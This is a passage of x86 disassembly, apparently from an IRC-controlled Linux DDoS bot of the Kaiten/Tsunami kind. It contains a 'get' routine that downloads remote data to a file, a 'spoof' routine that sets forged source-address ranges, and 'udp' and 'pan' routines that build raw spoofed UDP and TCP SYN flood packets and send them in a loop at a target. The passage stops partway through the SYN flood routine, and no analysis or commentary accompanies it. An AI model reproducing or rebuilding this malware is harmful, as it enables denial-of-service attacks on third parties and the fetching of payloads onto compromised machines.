jmp    8049714 <get+0x125>
add    DWORD PTR [ebp-0x28],0x1
mov    edx,DWORD PTR [ebp-0x28]
lea    eax,[ebp-0x43c]
mov    ecx,0xffffffff
mov    DWORD PTR [ebp-0x1458],eax
mov    eax,0x0
cld    
mov    edi,DWORD PTR [ebp-0x1458]
repnz scas al,BYTE PTR es:[edi]
mov    eax,ecx
not    eax
sub    eax,0x1
cmp    edx,eax
jae    8049750 <get+0x161>
mov    eax,DWORD PTR [ebp-0x28]
movzx  eax,BYTE PTR [ebp+eax*1-0x43c]
cmp    al,0x2f
jne    8049710 <get+0x121>
mov    eax,DWORD PTR [ebp-0x28]
mov    BYTE PTR [ebp+eax*1-0x43c],0x0
mov    WORD PTR [ebp-0x3c],0x2
mov    DWORD PTR [esp],0x16
call   8048a38 <htons@plt>
mov    WORD PTR [ebp-0x3a],ax
lea    eax,[ebp-0x43c]
mov    DWORD PTR [esp],eax
call   8048998 <inet_addr@plt>
mov    DWORD PTR [ebp-0x20],eax
cmp    DWORD PTR [ebp-0x20],0xffffffff
jne    80497e4 <get+0x1f5>
lea    eax,[ebp-0x43c]
mov    DWORD PTR [esp],eax
call   8048c08 <gethostbyname@plt>
mov    DWORD PTR [ebp-0x18],eax
cmp    DWORD PTR [ebp-0x18],0x0
jne    80497c5 <get+0x1d6>
mov    eax,DWORD PTR [ebp+0xc]
mov    DWORD PTR [esp+0x8],eax
mov    DWORD PTR [esp+0x4],0x804c828
mov    eax,DWORD PTR [ebp+0x8]
mov    DWORD PTR [esp],eax
call   8048e47 <Send>
mov    DWORD PTR [esp],0x0
call   8048c18 <exit@plt>
mov    eax,DWORD PTR [ebp-0x18]
mov    eax,DWORD PTR [eax+0xc]
mov    ecx,eax
mov    eax,DWORD PTR [ebp-0x18]
mov    eax,DWORD PTR [eax+0x10]
mov    edx,DWORD PTR [eax]
lea    eax,[ebp-0x3c]
add    eax,0x4
mov    edi,eax
mov    esi,edx
cld    
rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
jmp    80497ea <get+0x1fb>
mov    eax,DWORD PTR [ebp-0x20]
mov    DWORD PTR [ebp-0x38],eax
lea    eax,[ebp-0x3c]
add    eax,0x8
mov    DWORD PTR [eax],0x0
mov    DWORD PTR [eax+0x4],0x0
lea    eax,[ebp-0x3c]
mov    DWORD PTR [esp+0x8],0x10
mov    DWORD PTR [esp+0x4],eax
mov    eax,DWORD PTR [ebp-0x2c]
mov    DWORD PTR [esp],eax
call   8048938 <connect@plt>
test   eax,eax
je     8049841 <get+0x252>
mov    eax,DWORD PTR [ebp+0xc]
mov    DWORD PTR [esp+0x8],eax
mov    DWORD PTR [esp+0x4],0x804c850
mov    eax,DWORD PTR [ebp+0x8]
mov    DWORD PTR [esp],eax
call   8048e47 <Send>
mov    DWORD PTR [esp],0x0
call   8048c18 <exit@plt>
mov    eax,DWORD PTR [ebp-0x28]
mov    edx,eax
lea    eax,[ebp-0x43c]
add    eax,edx
lea    edx,[eax+0x1]
lea    eax,[ebp-0x43c]
mov    DWORD PTR [esp+0xc],eax
mov    DWORD PTR [esp+0x8],edx
mov    DWORD PTR [esp+0x4],0x804c878
mov    eax,DWORD PTR [ebp-0x2c]
mov    DWORD PTR [esp],eax
call   8048e47 <Send>
mov    eax,DWORD PTR [ebp+0xc]
mov    DWORD PTR [esp+0x8],eax
mov    DWORD PTR [esp+0x4],0x804c98c
mov    eax,DWORD PTR [ebp+0x8]
mov    DWORD PTR [esp],eax
call   8048e47 <Send>
mov    eax,DWORD PTR [ebp+0x14]
add    eax,0x8
mov    eax,DWORD PTR [eax]
mov    DWORD PTR [esp+0x4],0x804c9a8
mov    DWORD PTR [esp],eax
call   8048ab8 <fopen@plt>
mov    DWORD PTR [ebp-0x1c],eax
mov    DWORD PTR [esp+0xc],0x0
mov    DWORD PTR [esp+0x8],0x1000
lea    eax,[ebp-0x143c]
mov    DWORD PTR [esp+0x4],eax
mov    eax,DWORD PTR [ebp-0x2c]
mov    DWORD PTR [esp],eax
call   8048988 <recv@plt>
mov    DWORD PTR [ebp-0x14],eax
cmp    DWORD PTR [ebp-0x14],0x0
jle    804998e <get+0x39f>
cmp    DWORD PTR [ebp-0x14],0xfff
jg     80498ed <get+0x2fe>
mov    eax,DWORD PTR [ebp-0x14]
mov    BYTE PTR [ebp+eax*1-0x143c],0x0
mov    DWORD PTR [ebp-0x24],0x0
jmp    804997d <get+0x38e>
mov    eax,DWORD PTR [ebp-0x24]
mov    edx,eax
lea    eax,[ebp-0x143c]
add    eax,edx
mov    DWORD PTR [ebp-0x145c],eax
mov    DWORD PTR [ebp-0x1460],0x804c9ab
mov    DWORD PTR [ebp-0x1464],0x4
cld    
mov    esi,DWORD PTR [ebp-0x145c]
mov    edi,DWORD PTR [ebp-0x1460]
mov    ecx,DWORD PTR [ebp-0x1464]
repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
seta   dl
setb   al
mov    ecx,edx
sub    cl,al
mov    eax,ecx
movsx  eax,al
test   eax,eax
jne    8049979 <get+0x38a>
add    DWORD PTR [ebp-0x24],0x4
jmp    804996f <get+0x380>
mov    eax,DWORD PTR [ebp-0x24]
movzx  eax,BYTE PTR [ebp+eax*1-0x143c]
movzx  edx,al
mov    eax,DWORD PTR [ebp-0x1c]
mov    DWORD PTR [esp+0x4],eax
mov    DWORD PTR [esp],edx
call   8048b88 <fputc@plt>
add    DWORD PTR [ebp-0x24],0x1
mov    eax,DWORD PTR [ebp-0x24]
cmp    eax,DWORD PTR [ebp-0x14]
jl     804994e <get+0x35f>
jmp    804998e <get+0x39f>
add    DWORD PTR [ebp-0x24],0x1
mov    eax,DWORD PTR [ebp-0x24]
cmp    eax,DWORD PTR [ebp-0x14]
jl     80498f9 <get+0x30a>
jmp    80498a7 <get+0x2b8>
mov    eax,DWORD PTR [ebp+0x14]
add    eax,0x8
mov    eax,DWORD PTR [eax]
mov    DWORD PTR [esp+0xc],eax
mov    eax,DWORD PTR [ebp+0xc]
mov    DWORD PTR [esp+0x8],eax
mov    DWORD PTR [esp+0x4],0x804c9b0
mov    eax,DWORD PTR [ebp+0x8]
mov    DWORD PTR [esp],eax
call   8048e47 <Send>
mov    DWORD PTR [esp+0xc],0x0
mov    DWORD PTR [esp+0x8],0x1000
lea    eax,[ebp-0x143c]
mov    DWORD PTR [esp+0x4],eax
mov    eax,DWORD PTR [ebp-0x2c]
mov    DWORD PTR [esp],eax
call   8048988 <recv@plt>
mov    DWORD PTR [ebp-0x10],eax
cmp    DWORD PTR [ebp-0x10],0x0
jle    8049a2a <get+0x43b>
cmp    DWORD PTR [ebp-0x10],0xfff
jg     80499f6 <get+0x407>
mov    eax,DWORD PTR [ebp-0x10]
mov    BYTE PTR [ebp+eax*1-0x143c],0x0
mov    DWORD PTR [ebp-0xc],0x0
jmp    8049a20 <get+0x431>
mov    eax,DWORD PTR [ebp-0xc]
movzx  eax,BYTE PTR [ebp+eax*1-0x143c]
movzx  edx,al
mov    eax,DWORD PTR [ebp-0x1c]
mov    DWORD PTR [esp+0x4],eax
mov    DWORD PTR [esp],edx
call   8048b88 <fputc@plt>
add    DWORD PTR [ebp-0xc],0x1
mov    eax,DWORD PTR [ebp-0xc]
cmp    eax,DWORD PTR [ebp-0x10]
jl     80499ff <get+0x410>
jmp    80499b4 <get+0x3c5>
mov    eax,DWORD PTR [ebp-0x1c]
mov    DWORD PTR [esp],eax
call   8048a88 <fclose@plt>
mov    eax,DWORD PTR [ebp-0x2c]
mov    DWORD PTR [esp],eax
call   8048b58 <close@plt>
mov    DWORD PTR [esp],0x0
call   8048c18 <exit@plt>
add    esp,0x1470
pop    esi
pop    edi
pop    ebp
ret    
push   ebp
mov    ebp,esp
push   edi
push   esi
push   ebx
sub    esp,0x4c
mov    eax,ds:0x804e4e8
mov    DWORD PTR [ebp-0x10],eax
mov    edx,DWORD PTR ds:0x804e4ec
mov    eax,ds:0x804e4e8
lea    eax,[edx+eax*1]
sub    eax,0x1
mov    DWORD PTR [ebp-0x14],eax
mov    eax,ds:0x804e4ec
cmp    eax,0x1
jne    8049ae1 <getspoofs+0x8b>
lea    eax,[ebp-0x10]
movzx  eax,BYTE PTR [eax]
movzx  ebx,al
lea    eax,[ebp-0x10]
add    eax,0x1
movzx  eax,BYTE PTR [eax]
movzx  edx,al
lea    eax,[ebp-0x10]
add    eax,0x2
movzx  eax,BYTE PTR [eax]
movzx  ecx,al
lea    eax,[ebp-0x10]
add    eax,0x3
movzx  eax,BYTE PTR [eax]
movzx  eax,al
mov    DWORD PTR [esp+0x18],ebx
mov    DWORD PTR [esp+0x14],edx
mov    DWORD PTR [esp+0x10],ecx
mov    DWORD PTR [esp+0xc],eax
mov    eax,DWORD PTR [ebp+0xc]
mov    DWORD PTR [esp+0x8],eax
mov    DWORD PTR [esp+0x4],0x804c9c8
mov    eax,DWORD PTR [ebp+0x8]
mov    DWORD PTR [esp],eax
call   8048e47 <Send>
jmp    8049b81 <getspoofs+0x12b>
lea    eax,[ebp-0x14]
movzx  eax,BYTE PTR [eax]
movzx  edx,al
lea    eax,[ebp-0x14]
add    eax,0x1
movzx  eax,BYTE PTR [eax]
movzx  ecx,al
lea    eax,[ebp-0x14]
add    eax,0x2
movzx  eax,BYTE PTR [eax]
movzx  ebx,al
lea    eax,[ebp-0x14]
add    eax,0x3
movzx  eax,BYTE PTR [eax]
movzx  esi,al
lea    eax,[ebp-0x10]
movzx  eax,BYTE PTR [eax]
movzx  edi,al
lea    eax,[ebp-0x10]
add    eax,0x1
movzx  eax,BYTE PTR [eax]
movzx  eax,al
mov    DWORD PTR [ebp-0x24],eax
lea    eax,[ebp-0x10]
add    eax,0x2
movzx  eax,BYTE PTR [eax]
movzx  eax,al
mov    DWORD PTR [ebp-0x20],eax
lea    eax,[ebp-0x10]
add    eax,0x3
movzx  eax,BYTE PTR [eax]
movzx  eax,al
mov    DWORD PTR [esp+0x28],edx
mov    DWORD PTR [esp+0x24],ecx
mov    DWORD PTR [esp+0x20],ebx
mov    DWORD PTR [esp+0x1c],esi
mov    DWORD PTR [esp+0x18],edi
mov    edx,DWORD PTR [ebp-0x24]
mov    DWORD PTR [esp+0x14],edx
mov    edx,DWORD PTR [ebp-0x20]
mov    DWORD PTR [esp+0x10],edx
mov    DWORD PTR [esp+0xc],eax
mov    eax,DWORD PTR [ebp+0xc]
mov    DWORD PTR [esp+0x8],eax
mov    DWORD PTR [esp+0x4],0x804c9e8
mov    eax,DWORD PTR [ebp+0x8]
mov    DWORD PTR [esp],eax
call   8048e47 <Send>
add    esp,0x4c
pop    ebx
pop    esi
pop    edi
pop    ebp
ret    
push   ebp
mov    ebp,esp
sub    esp,0x18
mov    eax,DWORD PTR [ebp+0xc]
mov    DWORD PTR [esp+0x8],eax
mov    DWORD PTR [esp+0x4],0x804ca16
mov    eax,DWORD PTR [ebp+0x8]
mov    DWORD PTR [esp],eax
call   8048e47 <Send>
leave  
ret    
push   ebp
mov    ebp,esp
push   edi
sub    esp,0x14
cmp    DWORD PTR [ebp+0x10],0x1
je     8049bd4 <nickc+0x29>
mov    eax,DWORD PTR [ebp+0xc]
mov    DWORD PTR [esp+0x8],eax
mov    DWORD PTR [esp+0x4],0x804ca30
mov    eax,DWORD PTR [ebp+0x8]
mov    DWORD PTR [esp],eax
call   8048e47 <Send>
jmp    8049c36 <nickc+0x8b>
mov    eax,DWORD PTR [ebp+0x14]
add    eax,0x4
mov    eax,DWORD PTR [eax]
mov    ecx,0xffffffff
mov    DWORD PTR [ebp-0x8],eax
mov    eax,0x0
cld    
mov    edi,DWORD PTR [ebp-0x8]
repnz scas al,BYTE PTR es:[edi]
mov    eax,ecx
not    eax
sub    eax,0x1
cmp    eax,0x9
jbe    8049c17 <nickc+0x6c>
mov    eax,DWORD PTR [ebp+0xc]
mov    DWORD PTR [esp+0x8],eax
mov    DWORD PTR [esp+0x4],0x804ca48
mov    eax,DWORD PTR [ebp+0x8]
mov    DWORD PTR [esp],eax
call   8048e47 <Send>
jmp    8049c36 <nickc+0x8b>
mov    eax,DWORD PTR [ebp+0x14]
add    eax,0x4
mov    eax,DWORD PTR [eax]
mov    DWORD PTR [esp+0x8],eax
mov    DWORD PTR [esp+0x4],0x804ca7d
mov    eax,DWORD PTR [ebp+0x8]
mov    DWORD PTR [esp],eax
call   8048e47 <Send>
add    esp,0x14
pop    edi
pop    ebp
ret    
push   ebp
mov    ebp,esp
push   edi
sub    esp,0x134
cmp    DWORD PTR [ebp+0x10],0x1
je     8049c7f <spoof+0x43>
mov    eax,DWORD PTR [ebp+0xc]
mov    DWORD PTR [esp+0x8],eax
mov    DWORD PTR [esp+0x4],0x804ca88
mov    eax,DWORD PTR [ebp+0x8]
mov    DWORD PTR [esp],eax
call   8048e47 <Send>
mov    DWORD PTR ds:0x804e4e8,0x0
mov    DWORD PTR ds:0x804e4ec,0x0
jmp    8049e3a <spoof+0x1fe>
mov    eax,DWORD PTR [ebp+0x14]
add    eax,0x4
mov    eax,DWORD PTR [eax]
mov    ecx,0xffffffff
mov    DWORD PTR [ebp-0x118],eax
mov    eax,0x0
cld    
mov    edi,DWORD PTR [ebp-0x118]
repnz scas al,BYTE PTR es:[edi]
mov    eax,ecx
not    eax
sub    eax,0x1
cmp    eax,0x10
jbe    8049ccb <spoof+0x8f>
mov    eax,DWORD PTR [ebp+0xc]
mov    DWORD PTR [esp+0x8],eax
mov    DWORD PTR [esp+0x4],0x804caa8
mov    eax,DWORD PTR [ebp+0x8]
mov    DWORD PTR [esp],eax
call   8048e47 <Send>
jmp    8049e3a <spoof+0x1fe>
mov    eax,DWORD PTR [ebp+0x14]
add    eax,0x4
mov    eax,DWORD PTR [eax]
mov    DWORD PTR [esp+0x4],eax
lea    eax,[ebp-0x110]
mov    DWORD PTR [esp],eax
call   8048af8 <strcpy@plt>
lea    eax,[ebp-0x110]
mov    ecx,0xffffffff
mov    DWORD PTR [ebp-0x11c],eax
mov    eax,0x0
cld    
mov    edi,DWORD PTR [ebp-0x11c]
repnz scas al,BYTE PTR es:[edi]
mov    eax,ecx
not    eax
sub    eax,0x1
sub    eax,0x1
movzx  eax,BYTE PTR [ebp+eax*1-0x110]
cmp    al,0x2e
jne    8049d4b <spoof+0x10f>
lea    eax,[ebp-0x110]
mov    ecx,0xffffffff
mov    DWORD PTR [ebp-0x120],eax
mov    eax,0x0
cld    
mov    edi,DWORD PTR [ebp-0x120]
repnz scas al,BYTE PTR es:[edi]
mov    eax,ecx
not    eax
sub    eax,0x1
sub    eax,0x1
mov    BYTE PTR [ebp+eax*1-0x110],0x0
mov    DWORD PTR [ebp-0x10],0x0
mov    DWORD PTR [ebp-0xc],0x1
jmp    8049d72 <spoof+0x136>
mov    eax,DWORD PTR [ebp-0x10]
movzx  eax,BYTE PTR [ebp+eax*1-0x110]
cmp    al,0x2e
jne    8049d6e <spoof+0x132>
add    DWORD PTR [ebp-0xc],0x1
add    DWORD PTR [ebp-0x10],0x1
mov    edx,DWORD PTR [ebp-0x10]
lea    eax,[ebp-0x110]
mov    ecx,0xffffffff
mov    DWORD PTR [ebp-0x124],eax
mov    eax,0x0
cld    
mov    edi,DWORD PTR [ebp-0x124]
repnz scas al,BYTE PTR es:[edi]
mov    eax,ecx
not    eax
sub    eax,0x1
cmp    edx,eax
jb     8049d5b <spoof+0x11f>
mov    eax,0x4
sub    eax,DWORD PTR [ebp-0xc]
mov    DWORD PTR [ebp-0xc],eax
mov    DWORD PTR [ebp-0x10],0x0
jmp    8049def <spoof+0x1b3>
lea    edx,[ebp-0x110]
lea    eax,[ebp-0x110]
mov    ecx,0xffffffff
mov    DWORD PTR [ebp-0x128],eax
mov    eax,0x0
cld    
mov    edi,DWORD PTR [ebp-0x128]
repnz scas al,BYTE PTR es:[edi]
mov    eax,ecx
not    eax
sub    eax,0x1
lea    eax,[edx+eax*1]
mov    WORD PTR [eax],0x302e
mov    BYTE PTR [eax+0x2],0x0
add    DWORD PTR [ebp-0x10],0x1
mov    eax,DWORD PTR [ebp-0x10]
cmp    eax,DWORD PTR [ebp-0xc]
jl     8049db3 <spoof+0x177>
lea    eax,[ebp-0x110]
mov    DWORD PTR [esp],eax
call   8048978 <inet_network@plt>
mov    DWORD PTR [ebp-0x8],eax
cmp    DWORD PTR [ebp-0xc],0x0
jne    8049e1a <spoof+0x1de>
mov    DWORD PTR ds:0x804e4ec,0x1
jmp    8049e32 <spoof+0x1f6>
mov    eax,DWORD PTR [ebp-0xc]
mov    DWORD PTR [esp+0x4],eax
mov    DWORD PTR [esp],0x100
call   8049528 <pow>
mov    ds:0x804e4ec,eax
mov    eax,DWORD PTR [ebp-0x8]
mov    ds:0x804e4e8,eax
add    esp,0x134
pop    edi
pop    ebp
ret    
push   ebp
mov    ebp,esp
sub    esp,0x28
mov    eax,DWORD PTR [ebp+0xc]
mov    DWORD PTR [esp],eax
call   8048998 <inet_addr@plt>
mov    ds:0x804e900,eax
mov    eax,ds:0x804e900
cmp    eax,0xffffffff
jne    8049ecb <host2ip+0x88>
mov    eax,DWORD PTR [ebp+0xc]
mov    DWORD PTR [esp],eax
call   8048c08 <gethostbyname@plt>
mov    DWORD PTR [ebp-0x4],eax
cmp    DWORD PTR [ebp-0x4],0x0
jne    8049ea6 <host2ip+0x63>
mov    eax,ds:0x804e920
mov    edx,DWORD PTR [ebp+0xc]
mov    DWORD PTR [esp+0xc],edx
mov    edx,DWORD PTR [ebp+0x8]
mov    DWORD PTR [esp+0x8],edx
mov    DWORD PTR [esp+0x4],0x804caf4
mov    DWORD PTR [esp],eax
call   8048e47 <Send>
mov    DWORD PTR [esp],0x0
call   8048c18 <exit@plt>
mov    eax,DWORD PTR [ebp-0x4]
mov    eax,DWORD PTR [eax+0xc]
mov    edx,eax
mov    ecx,0x804e900
mov    eax,DWORD PTR [ebp-0x4]
mov    eax,DWORD PTR [eax+0x10]
mov    eax,DWORD PTR [eax]
mov    DWORD PTR [esp+0x8],edx
mov    DWORD PTR [esp+0x4],ecx
mov    DWORD PTR [esp],eax
call   8048a98 <bcopy@plt>
mov    eax,ds:0x804e900
leave  
ret    
push   ebp
mov    ebp,esp
sub    esp,0x638
mov    DWORD PTR [ebp-0x24],0x0
mov    DWORD PTR [esp],0x0
call   8048b68 <time@plt>
mov    DWORD PTR [ebp-0x4],eax
mov    eax,DWORD PTR [ebp+0xc]
mov    DWORD PTR [esp],eax
call   8048eaa <mfork>
test   eax,eax
jne    804a17e <udp+0x2ac>
mov    DWORD PTR [esp+0x8],0xff
mov    DWORD PTR [esp+0x4],0x3
mov    DWORD PTR [esp],0x2
call   8048a78 <socket@plt>
mov    DWORD PTR [ebp-0x8],eax
cmp    DWORD PTR [ebp-0x8],0x0
jns    8049f35 <udp+0x63>
mov    DWORD PTR [esp],0x1
call   8048c18 <exit@plt>
cmp    DWORD PTR [ebp+0x10],0x2
jg     8049f61 <udp+0x8f>
mov    eax,DWORD PTR [ebp+0xc]
mov    DWORD PTR [esp+0x8],eax
mov    DWORD PTR [esp+0x4],0x804cb18
mov    eax,DWORD PTR [ebp+0x8]
mov    DWORD PTR [esp],eax
call   8048e47 <Send>
mov    DWORD PTR [esp],0x1
call   8048c18 <exit@plt>
mov    eax,DWORD PTR [ebp+0x14]
add    eax,0x4
mov    eax,DWORD PTR [eax]
mov    DWORD PTR [esp+0x4],eax
mov    eax,DWORD PTR [ebp+0xc]
mov    DWORD PTR [esp],eax
call   8049e43 <host2ip>
mov    DWORD PTR [ebp-0x1c],eax
mov    eax,DWORD PTR [ebp+0x14]
add    eax,0x8
mov    eax,DWORD PTR [eax]
mov    DWORD PTR [esp],eax
call   8048b28 <atoi@plt>
mov    DWORD PTR [ebp-0x28],eax
mov    eax,DWORD PTR [ebp+0x14]
add    eax,0xc
mov    eax,DWORD PTR [eax]
mov    DWORD PTR [esp],eax
call   8048b18 <atol@plt>
mov    DWORD PTR [ebp-0x18],eax
lea    eax,[ebp-0x614]
mov    DWORD PTR [ebp-0x14],eax
lea    eax,[ebp-0x614]
add    eax,0x14
mov    DWORD PTR [ebp-0x10],eax
lea    eax,[ebp-0x614]
add    eax,0x1c
mov    DWORD PTR [ebp-0xc],eax
mov    DWORD PTR [esp+0x8],0x5c0
mov    DWORD PTR [esp+0x4],0xa
mov    eax,DWORD PTR [ebp-0xc]
mov    DWORD PTR [esp],eax
call   8048a08 <memset@plt>
mov    eax,DWORD PTR [ebp+0x14]
add    eax,0x4
mov    eax,DWORD PTR [eax]
mov    DWORD PTR [esp+0xc],eax
mov    eax,DWORD PTR [ebp+0xc]
mov    DWORD PTR [esp+0x8],eax
mov    DWORD PTR [esp+0x4],0x804cb3f
mov    eax,DWORD PTR [ebp+0x8]
mov    DWORD PTR [esp],eax
call   8048e47 <Send>
mov    edx,DWORD PTR [ebp-0x14]
movzx  eax,BYTE PTR [edx]
and    eax,0xfffffff0
or     eax,0x5
mov    BYTE PTR [edx],al
mov    edx,DWORD PTR [ebp-0x14]
movzx  eax,BYTE PTR [edx]
and    eax,0xf
or     eax,0x40
mov    BYTE PTR [edx],al
mov    eax,DWORD PTR [ebp-0x14]
mov    BYTE PTR [eax+0x1],0x0
mov    eax,DWORD PTR [ebp-0x14]
mov    WORD PTR [eax+0x2],0x5dc
mov    eax,DWORD PTR [ebp-0x14]
mov    WORD PTR [eax+0x6],0x0
mov    eax,DWORD PTR [ebp-0x14]
mov    BYTE PTR [eax+0x9],0x11
mov    eax,DWORD PTR [ebp-0x14]
mov    BYTE PTR [eax+0x8],0x40
mov    edx,DWORD PTR [ebp-0x14]
mov    eax,DWORD PTR [ebp-0x1c]
mov    DWORD PTR [edx+0x10],eax
mov    eax,DWORD PTR [ebp-0x20]
movzx  eax,ax
mov    DWORD PTR [esp],eax
call   8048a38 <htons@plt>
mov    edx,eax
mov    eax,DWORD PTR [ebp-0x10]
mov    WORD PTR [eax+0x4],dx
mov    WORD PTR [ebp-0x38],0x2
mov    eax,DWORD PTR [ebp-0x1c]
mov    DWORD PTR [ebp-0x34],eax
call   8048bd8 <rand@plt>
mov    edx,eax
mov    eax,DWORD PTR [ebp-0x10]
mov    WORD PTR [eax],dx
cmp    DWORD PTR [ebp-0x28],0x0
je     804a09e <udp+0x1cc>
mov    eax,DWORD PTR [ebp-0x28]
movzx  eax,ax
mov    DWORD PTR [esp],eax
call   8048a38 <htons@plt>
mov    edx,eax
mov    eax,DWORD PTR [ebp-0x10]
mov    WORD PTR [eax+0x2],dx
jmp    804a0ac <udp+0x1da>
call   8048bd8 <rand@plt>
mov    edx,eax
mov    eax,DWORD PTR [ebp-0x10]
mov    WORD PTR [eax+0x2],dx
lea    eax,[ebp-0x614]
mov    DWORD PTR [esp+0x4],0x5dc
mov    DWORD PTR [esp],eax
call   804956e <in_cksum>
mov    edx,eax
mov    eax,DWORD PTR [ebp-0x10]
mov    WORD PTR [eax+0x6],dx
call   8048f8e <getspoof>
mov    edx,eax
mov    eax,DWORD PTR [ebp-0x14]
mov    DWORD PTR [eax+0xc],edx
call   8048bd8 <rand@plt>
mov    edx,eax
mov    eax,DWORD PTR [ebp-0x14]
mov    WORD PTR [eax+0x4],dx
lea    eax,[ebp-0x614]
mov    DWORD PTR [esp+0x4],0x5dc
mov    DWORD PTR [esp],eax
call   804956e <in_cksum>
mov    edx,eax
mov    eax,DWORD PTR [ebp-0x14]
mov    WORD PTR [eax+0xa],dx
mov    eax,DWORD PTR [ebp-0x10]
movzx  eax,WORD PTR [eax+0x2]
mov    WORD PTR [ebp-0x36],ax
lea    eax,[ebp-0x38]
mov    DWORD PTR [esp+0x14],0x10
mov    DWORD PTR [esp+0x10],eax
mov    DWORD PTR [esp+0xc],0x0
mov    DWORD PTR [esp+0x8],0x5dc
lea    eax,[ebp-0x614]
mov    DWORD PTR [esp+0x4],eax
mov    eax,DWORD PTR [ebp-0x8]
mov    DWORD PTR [esp],eax
call   80489c8 <sendto@plt>
cmp    DWORD PTR [ebp-0x24],0x31
jbe    804a175 <udp+0x2a3>
mov    DWORD PTR [esp],0x0
call   8048b68 <time@plt>
mov    edx,eax
mov    eax,DWORD PTR [ebp-0x4]
add    eax,DWORD PTR [ebp-0x18]
cmp    edx,eax
jb     804a16e <udp+0x29c>
mov    DWORD PTR [esp],0x0
call   8048c18 <exit@plt>
mov    DWORD PTR [ebp-0x24],0x0
add    DWORD PTR [ebp-0x24],0x1
jmp    804a072 <udp+0x1a0>
leave  
ret    
push   ebp
mov    ebp,esp
sub    esp,0x118
lea    ecx,[ebp-0xf8]
mov    edx,0x804cb60
mov    eax,0x50
mov    DWORD PTR [esp+0x8],eax
mov    DWORD PTR [esp+0x4],edx
mov    DWORD PTR [esp],ecx
call   8048aa8 <memcpy@plt>
mov    DWORD PTR [ebp-0x28],0x0
mov    DWORD PTR [ebp-0x24],0x14
mov    DWORD PTR [esp],0x0
call   8048b68 <time@plt>
mov    DWORD PTR [ebp-0x8],eax
mov    eax,DWORD PTR [ebp+0xc]
mov    DWORD PTR [esp],eax
call   8048eaa <mfork>
test   eax,eax
jne    804a56c <pan+0x3ec>
cmp    DWORD PTR [ebp+0x10],0x2
jg     804a205 <pan+0x85>
mov    eax,DWORD PTR [ebp+0xc]
mov    DWORD PTR [esp+0x8],eax
mov    DWORD PTR [esp+0x4],0x804cbb0
mov    eax,DWORD PTR [ebp+0x8]
mov    DWORD PTR [esp],eax
call   8048e47 <Send>
mov    DWORD PTR [esp],0x1
call   8048c18 <exit@plt>
mov    DWORD PTR [esp+0x8],0xff
mov    DWORD PTR [esp+0x4],0x3
mov    DWORD PTR [esp],0x2
call   8048a78 <socket@plt>
mov    DWORD PTR [ebp-0xc],eax
cmp    DWORD PTR [ebp-0xc],0x0
jns    804a236 <pan+0xb6>
mov    DWORD PTR [esp],0x1
call   8048c18 <exit@plt>
mov    DWORD PTR [ebp-0x4],0x0
jmp    804a254 <pan+0xd4>
mov    edx,DWORD PTR [ebp-0x4]
mov    eax,DWORD PTR [ebp-0x4]
mov    eax,DWORD PTR [ebp+eax*4-0xf8]
mov    BYTE PTR [ebp+edx*1-0x3c],al
add    DWORD PTR [ebp-0x4],0x1
cmp    DWORD PTR [ebp-0x4],0x13
jle    804a23f <pan+0xbf>
mov    eax,DWORD PTR [ebp+0x14]
add    eax,0x4
mov    eax,DWORD PTR [eax]
mov    DWORD PTR [esp+0x4],eax
mov    eax,DWORD PTR [ebp+0xc]
mov    DWORD PTR [esp],eax
call   8049e43 <host2ip>
mov    DWORD PTR [ebp-0x14],eax
mov    eax,DWORD PTR [ebp+0x14]
add    eax,0xc
mov    eax,DWORD PTR [eax]
mov    DWORD PTR [esp],eax
call   8048b18 <atol@plt>
mov    DWORD PTR [ebp-0x10],eax
mov    eax,DWORD PTR [ebp+0x14]
add    eax,0x4
mov    eax,DWORD PTR [eax]
mov    DWORD PTR [esp+0xc],eax
mov    eax,DWORD PTR [ebp+0xc]
mov    DWORD PTR [esp+0x8],eax
mov    DWORD PTR [esp+0x4],0x804cbd7
mov    eax,DWORD PTR [ebp+0x8]
mov    DWORD PTR [esp],eax
call   8048e47 <Send>
movzx  eax,BYTE PTR [ebp-0x64]
and    eax,0xfffffff0
or     eax,0x5
mov    BYTE PTR [ebp-0x64],al
movzx  eax,BYTE PTR [ebp-0x64]
and    eax,0xf
or     eax,0x40
mov    BYTE PTR [ebp-0x64],al
mov    BYTE PTR [ebp-0x63],0x10
mov    WORD PTR [ebp-0x5e],0x40
mov    BYTE PTR [ebp-0x5c],0x40
mov    BYTE PTR [ebp-0x5b],0x6
mov    DWORD PTR [ebp-0x48],0x0
movzx  eax,BYTE PTR [ebp-0x44]
and    eax,0xf
or     eax,0xffffffa0
mov    BYTE PTR [ebp-0x44],al
movzx  eax,BYTE PTR [ebp-0x44]
and    eax,0xfffffff0
mov    BYTE PTR [ebp-0x44],al
movzx  eax,BYTE PTR [ebp-0x43]
and    eax,0x7f
mov    BYTE PTR [ebp-0x43],al
movzx  eax,BYTE PTR [ebp-0x43]
and    eax,0xffffffbf
mov    BYTE PTR [ebp-0x43],al
movzx  eax,BYTE PTR [ebp-0x43]
and    eax,0xffffffdf
mov    BYTE PTR [ebp-0x43],al
movzx  eax,BYTE PTR [ebp-0x43]
and    eax,0xffffffef
mov    BYTE PTR [ebp-0x43],al
movzx  eax,BYTE PTR [ebp-0x43]
and    eax,0xfffffff7
mov    BYTE PTR [ebp-0x43],al
movzx  eax,BYTE PTR [ebp-0x43]
and    eax,0xfffffffb
mov    BYTE PTR [ebp-0x43],al
movzx  eax,BYTE PTR [ebp-0x43]
and    eax,0xfffffffe
mov    BYTE PTR [ebp-0x43],al
movzx  eax,BYTE PTR [ebp-0x43]
or     eax,0x2
mov    BYTE PTR [ebp-0x43],al
mov    WORD PTR [ebp-0x42],0x787d
mov    WORD PTR [ebp-0x3e],0x0
mov    eax,DWORD PTR [ebp+0x14]
add    eax,0x8
mov    eax,DWORD PTR [eax]
mov    DWORD PTR [esp],eax
call   8048b28 <atoi@plt>
movzx  eax,ax
mov    DWORD PTR [esp],eax
call   8048a38 <htons@plt>
movzx  eax,ax
mov    DWORD PTR [ebp-0x1c],eax
call   8048bd8 <rand@plt>
mov    DWORD PTR [ebp-0x20],eax
mov    eax,DWORD PTR [ebp+0x14]
add    eax,0x8
mov    eax,DWORD PTR [eax]
mov    DWORD PTR [esp],eax
call   8048b28 <atoi@plt>
test   eax,eax
jne    804a398 <pan+0x218>
call   8048bd8 <rand@plt>
mov    DWORD PTR [ebp-0x1c],eax
call   8048f8e <getspoof>
mov    DWORD PTR [ebp-0x18],eax
mov    eax,DWORD PTR [ebp-0x24]
add    eax,0x28
movzx  eax,ax
mov    DWORD PTR [esp],eax
call   8048a38 <htons@plt>
mov    WORD PTR [ebp-0x62],ax
